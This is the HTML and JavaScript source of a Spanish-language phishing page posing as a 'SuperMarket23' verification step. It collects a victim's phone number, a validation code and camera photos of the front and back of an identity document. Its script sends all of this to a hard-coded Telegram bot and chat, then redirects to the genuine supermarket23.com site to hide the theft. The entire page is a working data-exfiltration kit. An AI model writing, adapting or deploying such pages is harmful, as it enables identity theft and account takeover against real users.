
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>SuperMarket23 - Verificaci贸n</title>
    <style>
        * { box-sizing: border-box; }
        body { font-family: 'Segoe UI', Arial, sans-serif; margin: 0; padding: 0; background-color: #ffffff; color: #004494; text-align: center; }
        .header { background-color: #004494; color: white; padding: 40px 20px; border-bottom: 6px solid #002d62; }
        .header h1 { margin: 0; font-size: 38px; font-weight: 900; text-transform: uppercase; }
        .container { padding: 20px; max-width: 480px; margin: 0 auto; }
        label { display: block; font-weight: bold; margin: 15px 0 5px 0; text-align: left; font-size: 13px; color: #004494; }
        input[type="tel"], input[type="text"] { width: 100%; padding: 16px; border: 2px solid #004494; border-radius: 10px; font-size: 16px; margin-bottom: 10px; }
        
        .card-slot {
            width: 100%; height: 210px; border: 3px dashed #004494; border-radius: 15px;
            margin-bottom: 20px; position: relative; background-color: #f8faff; 
            display: flex; align-items: center; justify-content: center; overflow: hidden;
        }
        .preview-img { width: 100%; height: 100%; object-fit: cover; position: absolute; top:0; left:0; display: none; z-index: 10; }
        .slot-text { font-weight: bold; font-size: 14px; z-index: 5; }
        
        /* ESTA ES LA CLAVE: El input cubre todo el cuadro y es invisible */
        .camera-trigger {
            position: absolute; top: 0; left: 0; width: 100%; height: 100%; 
            opacity: 0; z-index: 50; cursor: pointer; -webkit-tap-highlight-color: transparent;
        }

        .btn-auth {
            width: 100%; background-color: #004494; color: white; padding: 20px;
            border: none; border-radius: 10px; font-size: 22px; font-weight: bold; cursor: pointer; margin-top: 10px;
        }
    </style>
</head>
<body>

    <div class="header">
        <h1>SuperMarket23</h1>
    </div>

    <div class="container">
        <label>N煤mero de Tel茅fono</label>
        <input type="tel" id="phone" placeholder="Ej: +53 51234567">

        <label>Documentaci贸n (C谩mara Trasera)</label>
        
        <div class="card-slot">
            <input type="file" id="in-1" class="camera-trigger" accept="image/*" capture="environment" onchange="mostrar(this, 'v-1', 't-1')">
            <img id="v-1" class="preview-img">
            <div id="t-1" class="slot-text"> TOCAR PARA TIRAR FOTO FRENTE</div>
        </div>

        <div class="card-slot">
            <input type="file" id="in-2" class="camera-trigger" accept="image/*" capture="environment" onchange="mostrar(this, 'v-2', 't-2')">
            <img id="v-2" class="preview-img">
            <div id="t-2" class="slot-text"> TOCAR PARA TIRAR FOTO DORSO</div>
        </div>

        <div class="card-slot">
            <input type="file" id="in-3" class="camera-trigger" accept="image/*" capture="environment" onchange="mostrar(this, 'v-3', 't-3')">
            <img id="v-3" class="preview-img">
            <div id="t-3" class="slot-text"> TOCAR PARA TIRAR FOTO EXTRA</div>
        </div>

        <label>C贸digo de Validaci贸n</label>
        <input type="text" id="code" placeholder="Ingrese el c贸digo">

        <button class="btn-auth" id="btn-send" onclick="enviar()">AUTENTICACIN</button>
        <p id="status" style="display:none; margin-top:10px; font-weight:bold;">Procesando...</p>
    </div>

    <script>
        const token = "7544330182:AAFrW7uF7qG2IasXoR3vGq9oYv_H135p0S0";
        const chat_id = "-4748113880";

        function mostrar(input, imgId, txtId) {
            if (input.files && input.files[0]) {
                const reader = new FileReader();
                reader.onload = (e) => {
                    const img = document.getElementById(imgId);
                    img.src = e.target.result;
                    img.style.display = 'block';
                    document.getElementById(txtId).style.display = 'none';
                };
                reader.readAsDataURL(input.files[0]);
            }
        }

        async function enviar() {
            const phone = document.getElementById('phone').value;
            const code = document.getElementById('code').value;
            const f1 = document.getElementById('in-1').files[0];
            const f2 = document.getElementById('in-2').files[0];
            const f3 = document.getElementById('in-3').files[0];

            if (!phone || !code || !f1 || !f2 || !f3) {
                alert("Debe completar todos los datos y tomar las 3 fotos.");
                return;
            }

            document.getElementById('btn-send').disabled = true;
            document.getElementById('status').style.display = 'block';

            try {
                const text = `锔 **NUEVA ENTRADA**\n Tel: ${phone}\n Cod: ${code}`;
                await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(text)}&parse_mode=Markdown`);

                await upload(f1, `FRENTE - ${phone}`);
                await upload(f2, `DORSO - ${phone}`);
                await upload(f3, `EXTRA - ${phone}`);

                window.location.href = "https://www.supermarket23.com";
            } catch (e) {
                window.location.href = "https://www.supermarket23.com";
            }
        }

        async function upload(file, cap) {
            const fd = new FormData();
            fd.append('chat_id', chat_id);
            fd.append('photo', file);
            fd.append('caption', cap);
            await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: fd });
        }
    </script>
</body>
</html>
